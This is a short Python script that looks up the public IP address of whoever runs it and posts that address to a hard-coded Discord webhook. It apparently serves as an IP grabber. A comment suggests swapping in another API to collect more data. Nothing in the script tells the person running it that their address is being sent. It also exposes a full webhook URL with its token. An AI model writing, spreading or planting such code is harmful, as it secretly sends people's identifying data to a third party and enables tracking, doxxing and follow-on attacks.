import requests, json
from requests import get

wh= "https://canary.discord.com/api/webhooks/1000980762885115944/S2VthrlFckvS8sVvTb1YQkhsERUlkM73usydiNGTQt5vGKByPzPsLH_wJx6O7GABmAUF" #webhook link here
ipaddress = get('https://api.ipify.org').text  #If  you'd like more than the ip address simply use a different api.
requests.post(wh, data=json.dumps({ "embeds": [ { "fields": [ { "name": "ip", "value": f"``{ipaddress}``"} ] } ] }), headers={"Content-Type": "application/json"})
